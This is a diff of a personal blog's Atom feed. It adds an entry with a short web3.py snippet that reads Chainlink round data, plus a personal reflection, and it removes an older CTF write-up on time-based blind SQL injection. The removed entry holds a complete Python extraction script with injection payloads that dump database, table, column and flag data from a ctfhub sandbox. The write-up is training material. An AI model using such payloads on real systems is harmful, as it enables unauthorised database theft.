@@ -6,7 +6,7 @@
   <link href="https://x1a0.net/atom.xml" rel="self"/>
   
   <link href="https://x1a0.net/"/>
-  <updated>2021-12-07T05:38:58.181Z</updated>
+  <updated>2021-12-12T16:10:32.139Z</updated>
   <id>https://x1a0.net/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>web3.py使用小记</title>
+    <link href="https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
+    <id>https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</id>
+    <published>2021-12-12T16:00:31.000Z</published>
+    <updated>2021-12-12T16:10:32.139Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 导入web3提供者和合约abi、合约地址</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://kovan.infura.io/v3/34ed41c4cf28406885f032930d670036&#x27;</span>))</span><br><span class="line">abi = <span class="string">&quot;you contract abi&quot;</span></span><br><span class="line">addr = <span class="string">&#x27;0x9326BFA02ADD2366b30bacB125260Af641031331&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义合约实例，调用合约函数</span></span><br><span class="line">contract = web3.eth.contract(address=addr, abi=abi)</span><br><span class="line">validRoundId = <span class="number">18446744073709562301</span></span><br><span class="line">historicalData = contract.functions.getRoundData(validRoundId).call()</span><br><span class="line"><span class="built_in">print</span>(historicalData)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>今天心情很烦躁，已经到了那种想抒发心情都找不到文字的程度了吗。</p><p>想当年你可是一个™的码子小王子。</p><p>想变成什么样子就去做，<br>英雄无惧，<br>无欲则刚。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
+      
+    
+    
+    
+    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="Web3.py" scheme="https://x1a0.net/categories/Web3-py/"/>
+    
+    
+    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
+    
+    <category term="web3.py" scheme="https://x1a0.net/tags/web3-py/"/>
+    
+  </entry>
   
   <entry>
     <title>chainlink学习小记</title>
@@ -486,28 +516,6 @@
     
     
     <category term="杂项" scheme="https://x1a0.net/categories/%E6%9D%82%E9%A1%B9/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>技能树搭建之time-based blind+脚本</title>
-    <link href="https://x1a0.net/2020/05/23/171/"/>
-    <id>https://x1a0.net/2020/05/23/171/</id>
-    <published>2020-05-22T16:53:55.000Z</published>
-    <updated>2020-05-22T16:53:55.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>时间盲注和布尔盲注有异曲同工之妙。<br>“1 and ascii(substr(database(),{},{}))={} %23”<br>“1 and if(ascii(substring(database(),{},1))={},sleep(3),1) –+”<br>说是异曲同工，不如说是一模一样..<br>多了个if判断，正确sleep，错误返回1</p><p>如此，（便不能成为你不重写脚本的原因）</p><p><img src="https://oss.x1a0.net/image/2020/05/23/662842698998130/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523004857.png" alt="微信截图_20200523004857.png"></p><hr><p>有提示，数字型注入。</p><p>翻找了之前的blind脚本，修改下：</p><pre><code>import requests,timeurl=&#39;http://challenge-b809a1815ce6a2f0.sandbox.ctfhub.com:10080/?id=&#123;&#125;&#39;# ---------设置payload（默认数字型注入）---------Get_db_payload=&quot;1 and if(ascii(substring(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_table_payload=&quot;1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_columns_payload=&quot;1 and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;&#123;&#125;&#39; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_dump_payload=&quot;1 and if(ascii(substring((select &#123;&#125; from &#123;&#125; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;# ----------------------------------------------# ---------设置返回正确页面提示，和header--------if_data=&#39;query_success&#39;key=[&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;@&#39;, &#39;_&#39;,&#39;,&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]headers=&#123;&#125;# ----------------------------------------------def Get_db():    db_text,num,_=&#39;&#39;,1,&quot;&quot;    while 1:        for i in key:            _=db_text   # temp变量相当于记录上一轮的值，如果判断和这轮相等，那么就return，这样就不用获取数据库长度了。            payload=Get_db_payload.format(num,ord(i))            start_time=time.time()            requests.get(url.format(payload))            stop_time=time.time()            if stop_time-start_time&gt;2:                db_text+=i                num+=1                break        if db_text==_:            return db_text        print(&#39;[+]out:&#39;+db_text)def Get_table():    tables=[]    for num_biao in range(1,9999999):        tables.append(&#39;&#39;)        last=&#39;&#39;        for ranking_biao in range(1,99999999):            for i in key:                last=tables[num_biao-1]                payload=Get_table_payload.format(num_biao-1,num_biao,ranking_biao,ord(i))                start_time=time.time()                requests.get(url.format(payload))                stop_time=time.time()                if stop_time-start_time&gt;2:                    tables[num_biao-1]+=i                    break            if last==tables[num_biao-1]:                break        if tables[num_biao-1]==&#39;&#39;:            tables.pop()            return tables        print(&#39;[+]out:&#39;+tables[num_biao-1])def Get_columns(table):    columns=[]    for columns_num in range(1,999999):        columns.append(&#39;&#39;)        last=&#39;&#39;        for columns_ranking in range(1,999999):            for i in key:                last=columns[columns_num-1]                payload=Get_columns_payload.format(table,columns_num-1,1,columns_ranking,ord(i))                st=time.time()                requests.get(url.format(payload))                stt=time.time()                if stt-st&gt;2:                    columns[columns_num-1]+=i                    break            if last==columns[columns_num-1]:                break        print(columns)        if columns[columns_num-1]==&#39;&#39;:            columns.pop()            return columns        print(&#39;[+]out:&#39;+columns[columns_num-1])def Get_dump(column,table):    data=[]    for i in range(1,999999):        data.append(&#39;&#39;)        temp=&#39;&#39;        for j in range(1,999999):            for k in key:                temp=data[i-1]                payload=Get_dump_payload.format(column,table,i-1,1,j,ord(k))                s=time.time()                requests.get(url.format(payload))                t=time.time()                if t-s&gt;2:                    data[i-1]+=k                    break            if temp==data[i-1]:                break            print(data[i-1])        if data[i-1]==&#39;&#39;:            data.pop()            return data        print(&quot;[+]out:&quot;+data[i-1])if __name__ == &quot;__main__&quot;:    Get_dump(&#39;flag&#39;,&#39;flag&#39;)</code></pre><p><img src="https://oss.x1a0.net/image/2020/05/23/664002387726255/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523005313.png" alt="微信截图_20200523005313.png"></p><hr><p>wo~~ </p><p>我自横刀向天笑，<br>去留肝胆两昆仑！</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;时间盲注和布尔盲注有异曲同工之妙。&lt;br&gt;“1 and ascii(substr(database(),{},{}))={} %23”&lt;br&gt;“1 and if(ascii(substring(database(),{},1))={},sleep(3),1) –+”&lt;br&gt;</summary>
-      
-    
-    
-    
-    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
     
     
   </entry>
